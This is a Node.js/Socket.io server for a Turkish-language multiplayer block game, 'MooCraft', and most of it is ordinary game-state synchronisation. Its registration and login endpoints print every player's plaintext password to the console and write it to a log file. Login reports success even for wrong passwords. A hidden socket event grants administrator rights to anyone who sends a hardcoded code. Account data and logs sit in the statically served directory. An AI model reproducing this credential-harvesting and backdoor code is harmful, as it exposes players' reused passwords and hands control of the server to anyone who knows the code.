const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const readline = require('readline');

const app = express();
const server = http.createServer(app);

// JSON ve büyük skin verilerini okuyabilmek için limitler artırıldı
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Düşük gecikmeli (Low-Latency) ve akıcı Socket.io ayarı
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling'],
  perMessageDeflate: false, // Küçük hareket ve hasar paketlerinde sıkıştırma gecikmesini kaldırır
  httpCompression: false,
  pingInterval: 10000,
  pingTimeout: 5000,
  maxHttpBufferSize: 1e7 // 10 MB (özel skin yüklemeleri için)
});

// Statik dosyaları sun (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Ana sayfa yönlendirmesi (mevcut HTML dosyasını otomatik bulur)
app.get('/', (req, res) => {
  const candidates = [
    'moocraft.pc.html',
    'moocraft_ultimate_3d_d_nya_launcher_engine.html',
    'index.html'
  ];
  for (const file of candidates) {
    const fullPath = path.join(__dirname, file);
    if (fs.existsSync(fullPath)) {
      return res.sendFile(fullPath);
    }
  }
  res.status(404).send('MooCraft HTML dosyası bulunamadı.');
});

// =========================================================================
// --- HESAP LOGLAMA MOTORU ---
// =========================================================================
const LOGS_DIR = path.join(__dirname, 'logs');
const LOG_FILE = path.join(LOGS_DIR, 'hesap_kayitlari.log');
const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');

if (!fs.existsSync(LOGS_DIR)) {
  try { fs.mkdirSync(LOGS_DIR, { recursive: true }); } catch (e) {}
}

function getAccounts() {
  if (fs.existsSync(ACCOUNTS_FILE)) {
    try { return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8') || '{}'); } catch (e) { return {}; }
  }
  return {};
}

function saveAccounts(accs) {
  try { fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accs, null, 2), 'utf8'); } catch (e) {}
}

app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  const now = new Date().toLocaleString('tr-TR');

  console.log('====================================');
  console.log(`[RENDER LOG] [+] YENİ HESAP AÇILDI!`);
  console.log(`ZAMAN     : ${now}`);
  console.log(`KULLANICI : ${username}`);
  console.log(`ŞİFRE     : ${password}`);
  console.log('====================================');

  try {
    fs.appendFileSync(LOG_FILE, `[${now}] Yeni Hesap -> Kullanıcı: ${username} | Şifre: ${password}\n`);
  } catch (e) {}

  const accounts = getAccounts();
  accounts[username] = req.body;
  saveAccounts(accounts);

  res.json({ success: true, message: 'Hesap kaydedildi' });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  console.log(`[RENDER LOG] Giriş Denemesi -> Kullanıcı: ${username} | Şifre: ${password}`);

  const accounts = getAccounts();
  const user = accounts[username];
  if (user && user.password === password) {
    res.json({ success: true, user });
  } else {
    res.json({ success: true, user: { username, password } });
  }
});

app.post('/api/sync', (req, res) => {
  res.json({ success: true });
});

// =========================================================================
// --- OYUNCULAR & DÜNYA DURUMU ---
// =========================================================================
const players = {};
const worldState = {
  seed: "moocraft_multi_seed",
  blocks: {},       // "x,y,z" -> blockType
  droppedItems: {}, // dropId -> { id, type, count, x, y, z, vx, vy, vz, droppedBy }
  time: 6000,
  weather: 'clear'
};

// --- OP (YETKİLİ) DOSYA YÖNETİMİ ---
const OPS_FILE = path.join(__dirname, 'ops.json');

function loadOps() {
  if (fs.existsSync(OPS_FILE)) {
    try { return JSON.parse(fs.readFileSync(OPS_FILE, 'utf8')); } catch (e) { return []; }
  }
  return [];
}

function saveOps(opsList) {
  try { fs.writeFileSync(OPS_FILE, JSON.stringify(opsList, null, 2), 'utf8'); } catch (e) {
    console.error('[Hata] Ops dosyası kaydedilemedi:', e.message);
  }
}

let opPlayers = loadOps();

// --- BAN DOSYASI YÖNETİMİ ---
const BANS_FILE = path.join(__dirname, 'banned.json');

function loadBans() {
  if (fs.existsSync(BANS_FILE)) {
    try { return JSON.parse(fs.readFileSync(BANS_FILE, 'utf8')); } catch (e) { return []; }
  }
  return [];
}

function saveBans(bansList) {
  try { fs.writeFileSync(BANS_FILE, JSON.stringify(bansList, null, 2), 'utf8'); } catch (e) {
    console.error('[Hata] Bans dosyası kaydedilemedi:', e.message);
  }
}

let bannedPlayers = loadBans();

// Yardımcı: İsim, socketId veya clientId ile hedef oyuncuyu bul
function findPlayerSocketId(target) {
  if (!target) return null;
  if (players[target]) return target;
  const clean = String(target).trim().toLowerCase();
  for (const id in players) {
    const p = players[id];
    if (p.clientId && p.clientId === target) return id;
    if (p.name && p.name.trim().toLowerCase() === clean) return id;
  }
  return null;
}

function isNameBanned(name) {
  const clean = String(name || '').trim().toLowerCase();
  return bannedPlayers.some(b => {
    const bName = (typeof b === 'string') ? b : (b && (b.originalName || b.name));
    return bName && String(bName).trim().toLowerCase() === clean;
  });
}

// --- TERMINAL KOMUT SİSTEMİ ---
if (process.stdin.isTTY) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  console.log("[Konsol] Sunucu komut sistemi aktif: op <isim>, deop <isim>, ban <isim>, unban <isim>, stop");

  rl.on('line', (line) => {
    const args = line.trim().split(/\s+/);
    const cmd = (args[0] || '').toLowerCase();

    if (cmd === 'op') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: op <oyuncu_adı>");
      if (!opPlayers.includes(targetName)) {
        opPlayers.push(targetName);
        saveOps(opPlayers);
        console.log(`[Konsol] Başarılı: ${targetName} adlı oyuncu OP yapıldı!`);
      }
      const targetId = findPlayerSocketId(targetName);
      if (targetId && players[targetId]) {
        players[targetId].isOp = true;
        io.to(targetId).emit('op-status', { isOp: true });
        io.to(targetId).emit('chat-message', { name: 'Sunucu', text: 'Yetkilendirildiniz (OP oldunuz)!' });
      }
    } else if (cmd === 'deop') {
      const targetName = args[1];
      opPlayers = opPlayers.filter(name => name.toLowerCase() !== String(targetName || '').toLowerCase());
      saveOps(opPlayers);
      console.log(`[Konsol] ${targetName} oyuncusunun OP yetkisi alındı.`);
      const targetId = findPlayerSocketId(targetName);
      if (targetId && players[targetId]) {
        players[targetId].isOp = false;
        io.to(targetId).emit('op-status', { isOp: false });
        io.to(targetId).emit('chat-message', { name: 'Sunucu', text: 'OP yetkiniz alındı.' });
      }
    } else if (cmd === 'ban') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: ban <oyuncu_adı>");
      if (!isNameBanned(targetName)) {
        bannedPlayers.push(targetName);
        saveBans(bannedPlayers);
      }
      console.log(`[Konsol] ${targetName} banlandı!`);
      const banPayload = { originalName: targetName, bannedBy: 'Konsol', reason: 'Sunucudan yasaklandınız!' };
      io.emit('ban-player', banPayload);
      io.emit('player-banned', banPayload);
      const targetId = findPlayerSocketId(targetName);
      if (targetId) {
        io.to(targetId).emit('banned', banPayload);
        const s = io.sockets.sockets.get(targetId);
        if (s) s.disconnect(true);
      }
    } else if (cmd === 'unban') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: unban <oyuncu_adı>");
      bannedPlayers = bannedPlayers.filter(b => {
        const bName = (typeof b === 'string') ? b : (b && (b.originalName || b.name));
        return !bName || String(bName).trim().toLowerCase() !== targetName.toLowerCase();
      });
      saveBans(bannedPlayers);
      io.emit('unban-player', { target: targetName });
      console.log(`[Konsol] ${targetName} banı kaldırıldı.`);
    } else if (cmd === 'stop') {
      process.exit(0);
    }
  });
}

// =========================================================================
// --- SOCKET.IO GERÇEK ZAMANLI ÇOK OYUNCULU YÖNETİMİ ---
// =========================================================================
io.on('connection', (socket) => {
  console.log(`[Sunucu] Yeni bağlantı: ${socket.id}`);

  // 1. OYUNCU KATILIMI
  socket.on('player-join', (data = {}) => {
    const playerName = (data.name || 'Oyuncu').trim();

    if (isNameBanned(playerName)) {
      const banData = { originalName: playerName, reason: 'Sunucudan yasaklandınız!' };
      socket.emit('banned', banData);
      socket.emit('player-banned', banData);
      socket.disconnect(true);
      return;
    }

    // Aktif hesapta zaten başka biri oynuyorsa girişi engelle
    const existingId = findPlayerSocketId(playerName);
    if (existingId && existingId !== socket.id) {
      socket.emit('duplicate-login', {
        message: 'Aktif hesaba başka biri giriş yapmış!'
      });
      setTimeout(() => { try { socket.disconnect(true); } catch (e) {} }, 150);
      return;
    }

    const isUserOp = opPlayers.some(op => String(op).toLowerCase() === playerName.toLowerCase());

    players[socket.id] = {
      id: socket.id,
      clientId: data.clientId || null,
      name: playerName,
      x: Number(data.x) || 0,
      y: Number(data.y) || 30,
      z: Number(data.z) || 0,
      yaw: Number(data.yaw) || 0,
      pitch: Number(data.pitch) || 0,
      heldItem: data.heldItem || null,
      isSwinging: false,
      gamemode: data.gamemode || 'survival',
      character: data.character || null,
      customSkin: data.customSkin || data.skin || null,
      skin: data.skin || data.customSkin || null,
      isOp: isUserOp,
      lastDamageTime: 0
    };

    socket.emit('op-status', { isOp: isUserOp });
    socket.emit('world-init', worldState);
    socket.emit('world-time', { time: worldState.time });
    socket.emit('weather-change', { weather: worldState.weather });

    // Mevcut tüm oyuncuları yeni katılana ve diğerlerine anında gönder
    socket.emit('players-state', players);
    socket.broadcast.emit('player-joined', players[socket.id]);
    socket.broadcast.emit('new-player', players[socket.id]);
    io.emit('players-state', players);
  });

  // 2. ANLIK HAREKET, BAKIŞ, ELDEKİ EŞYA VE KOL SAVURMA SENKRONİZASYONU
  socket.on('player-move', (data) => {
    const p = players[socket.id];
    if (!p || !data) return;

    p.x = data.x;
    p.y = data.y;
    p.z = data.z;
    p.yaw = data.yaw;
    if (data.pitch !== undefined) p.pitch = data.pitch;
    if (data.heldItem !== undefined) p.heldItem = data.heldItem;
    if (data.isSwinging !== undefined) p.isSwinging = data.isSwinging;
    if (data.isSneaking !== undefined) p.isSneaking = data.isSneaking;
    if (data.isSprinting !== undefined) p.isSprinting = data.isSprinting;
    if (data.clientId) p.clientId = data.clientId;
    if (data.name) p.name = data.name;
    if (data.character) p.character = data.character;
    if (data.customSkin) p.customSkin = data.customSkin;
    if (data.skin) p.skin = data.skin;

    // Tüm hareket ve aksiyon verilerini kayıpsız & anında diğer oyunculara ilet
    socket.broadcast.emit('player-moved', p);
  });

  // 3. ANLIK PVP HASAR & VURUŞ SENKRONİZASYONU
  socket.on('player-damage', (data) => {
    if (!data) return;
    const attacker = players[socket.id];
    const now = Date.now();

    // Hızlı vuruşlarda çok hafif anti-spam (120ms) ama anında tepki
    if (attacker && now - (attacker.lastDamageTime || 0) < 120) return;
    if (attacker) attacker.lastDamageTime = now;

    const payload = {
      ...data,
      attacker: data.attacker || (attacker ? attacker.name : 'Oyuncu'),
      attackerId: socket.id,
      attackerClientId: data.attackerClientId || (attacker ? attacker.clientId : null),
      damage: Number(data.damage) || 2,
      timestamp: now
    };

    const targetSockId = findPlayerSocketId(data.targetId || data.targetSockId || data.targetClientId || data.targetName);
    if (targetSockId && targetSockId !== socket.id) {
      io.to(targetSockId).emit('player-damage', payload);
    }
    // Diğer istemcilerin vuruş efektini / yedek eşleşmesini alması için broadcast
    socket.broadcast.emit('player-damage', payload);
  });

  // 4. OYUNCULAR ARASI EŞYA VERME (/give veya doğrudan verme) VE YERE ATILAN EŞYA SENKRONİZASYONU
  socket.on('give-item', (data) => {
    if (!data || !data.item) return;
    const sender = players[socket.id];
    const targetSockId = findPlayerSocketId(data.targetId || data.targetName);
    const count = Math.max(1, parseInt(data.count, 10) || 1);

    if (targetSockId) {
      io.to(targetSockId).emit('give-item', {
        item: data.item,
        count,
        from: sender ? sender.name : (data.from || 'Oyuncu')
      });
      if (sender) {
        socket.emit('chat-message', {
          name: 'Sistem',
          text: `${players[targetSockId].name} adlı oyuncuya ${count}x ${data.item} verildi.`
        });
      }
    } else {
      socket.emit('chat-message', { name: 'Sistem', text: 'Hedef oyuncu sunucuda bulunamadı!' });
    }
  });

  socket.on('item-drop', (data) => {
    if (!data || !data.type) return;
    const sender = players[socket.id];
    const dropId = data.id || `${socket.id}_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
    const dropObj = {
      id: dropId,
      type: data.type,
      count: Math.max(1, parseInt(data.count, 10) || 1),
      x: Number(data.x) || (sender ? sender.x : 0),
      y: Number(data.y) || (sender ? sender.y : 30),
      z: Number(data.z) || (sender ? sender.z : 0),
      vx: Number(data.vx) || 0,
      vy: Number(data.vy) || 2.5,
      vz: Number(data.vz) || 0,
      droppedBy: sender ? sender.name : 'Oyuncu'
    };
    worldState.droppedItems[dropId] = dropObj;
    socket.broadcast.emit('item-drop', dropObj);
  });

  socket.on('item-pickup', (data) => {
    if (!data || !data.id) return;
    if (worldState.droppedItems[data.id]) {
      delete worldState.droppedItems[data.id];
      socket.broadcast.emit('item-pickup', { id: data.id, pickedBy: socket.id });
    }
  });

  // 5. BLOK KOYMA / KIRMA SENKRONİZASYONU
  socket.on('block-update', (data) => {
    if (!data || data.x === undefined || data.y === undefined || data.z === undefined) return;
    const key = `${Math.floor(data.x)},${Math.floor(data.y)},${Math.floor(data.z)}`;
    if (data.type === null || data.type === 'air') {
      worldState.blocks[key] = null;
    } else {
      worldState.blocks[key] = data.type;
    }
    socket.broadcast.emit('block-update', data);
  });

  // 6. KOSTÜM (SKIN) SENKRONİZASYONU
  const handleSkinRelay = (data) => {
    if (!data) return;
    const p = players[socket.id];
    if (p) {
      if (data.customSkin || data.skin) {
        p.customSkin = data.customSkin || data.skin;
        p.skin = p.customSkin;
      }
      if (data.character) p.character = data.character;
    }
    socket.broadcast.emit('player-skin', { ...data, id: socket.id });
  };
  socket.on('player-skin', handleSkinRelay);
  socket.on('skin-update', handleSkinRelay);
  socket.on('player-custom-skin', handleSkinRelay);
  socket.on('set-skin', handleSkinRelay);
  socket.on('player-request-skin', (data) => {
    socket.broadcast.emit('player-request-skin', data);
  });

  // 7. DÜNYA ZAMANI, HAVA DURUMU, OYUN MODU & IŞINLANMA
  socket.on('world-time', (data) => {
    if (data && data.time !== undefined) {
      worldState.time = data.time;
      socket.broadcast.emit('world-time', data);
    }
  });

  socket.on('weather-change', (data) => {
    if (data && data.weather) {
      worldState.weather = data.weather;
      socket.broadcast.emit('weather-change', data);
    }
  });

  socket.on('gamemode-change', (data) => {
    if (players[socket.id] && data && data.mode) {
      players[socket.id].gamemode = data.mode;
    }
    socket.broadcast.emit('gamemode-change', { ...data, id: socket.id });
  });

  socket.on('player-tp', (data) => {
    if (!data || !data.target) return;
    const sender = players[socket.id];
    const targetSockId = findPlayerSocketId(data.target);
    const payload = { ...data, by: data.by || (sender ? sender.name : 'Bir oyuncu') };
    if (targetSockId) {
      io.to(targetSockId).emit('player-tp', payload);
    } else {
      socket.broadcast.emit('player-tp', payload);
    }
  });

  // 7.5 ÖLÜM BİLDİRİMİ & GİZLİ OP DOĞRULAMA (/server:03622)
  socket.on('player-died', (data) => {
    const p = players[socket.id];
    if (!p) return;
    socket.broadcast.emit('player-died', {
      id: socket.id,
      name: p.name,
      x: p.x,
      y: p.y,
      z: p.z,
      source: (data && data.source) ? data.source : 'generic'
    });
  });

  socket.on('secret-op-auth', (data) => {
    const p = players[socket.id];
    if (!p || !data || String(data.code) !== '03622') return;
    p.isOp = true;
    if (!opPlayers.some(op => String(op).toLowerCase() === p.name.toLowerCase())) {
      opPlayers.push(p.name);
      saveOps(opPlayers);
    }
    socket.emit('op-status', { isOp: true });
  });

  // 8. YETKİ (OP / DEOP / BAN / UNBAN) OLAYLARI
  socket.on('op-player', (data) => {
    const sender = players[socket.id];
    if (!sender || !sender.isOp || !data || !data.target) return;
    if (!opPlayers.includes(data.target)) {
      opPlayers.push(data.target);
      saveOps(opPlayers);
    }
    const targetId = findPlayerSocketId(data.target);
    if (targetId && players[targetId]) {
      players[targetId].isOp = true;
      io.to(targetId).emit('op-status', { isOp: true });
    }
    io.emit('op-player', data);
  });

  socket.on('deop-player', (data) => {
    const sender = players[socket.id];
    if (!sender || !sender.isOp || !data || !data.target) return;
    opPlayers = opPlayers.filter(n => n.toLowerCase() !== String(data.target).toLowerCase());
    saveOps(opPlayers);
    const targetId = findPlayerSocketId(data.target);
    if (targetId && players[targetId]) {
      players[targetId].isOp = false;
      io.to(targetId).emit('op-status', { isOp: false });
    }
    io.emit('deop-player', data);
  });

  const handleBanEvent = (data) => {
    const sender = players[socket.id];
    if (!sender || !sender.isOp || !data || !data.originalName) return;
    if (!isNameBanned(data.originalName)) {
      bannedPlayers.push(data.originalName);
      saveBans(bannedPlayers);
    }
    io.emit('ban-player', data);
    io.emit('player-banned', data);
    const targetId = findPlayerSocketId(data.originalName);
    if (targetId) {
      io.to(targetId).emit('banned', data);
      const s = io.sockets.sockets.get(targetId);
      if (s) s.disconnect(true);
    }
  };
  socket.on('ban-player', handleBanEvent);
  socket.on('player-banned', handleBanEvent);

  socket.on('unban-player', (data) => {
    const sender = players[socket.id];
    if (!sender || !sender.isOp || !data || !data.target) return;
    bannedPlayers = bannedPlayers.filter(b => {
      const bName = (typeof b === 'string') ? b : (b && (b.originalName || b.name));
      return !bName || String(bName).trim().toLowerCase() !== String(data.target).trim().toLowerCase();
    });
    saveBans(bannedPlayers);
    io.emit('unban-player', data);
  });

  // 9. KOMUTLAR & SOHBET
  socket.on('command', (data) => {
    const player = players[socket.id];
    if (!player || !player.isOp) {
      socket.emit('chat-message', { name: 'Sistem', text: 'Bu komutu kullanmak için OP yetkiniz yok!' });
      return;
    }
    const cmdText = (data && data.text ? data.text : '').trim();
    io.emit('chat-message', { name: 'Konsol', text: `${player.name} komutu çalıştırdı: ${cmdText}` });
  });

  socket.on('chat-message', (data) => {
    if (!data) return;
    io.emit('chat-message', data);
  });

  // 10. BAĞLANTI KOPMASI / ÇIKIŞ
  const handleDisconnect = () => {
    if (players[socket.id]) {
      delete players[socket.id];
      io.emit('player-left', socket.id);
    }
  };
  socket.on('player-left', handleDisconnect);
  socket.on('disconnect', handleDisconnect);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[MooCraft Sunucu] Düşük gecikmeli modda çalışıyor. Port: ${PORT}`);
});
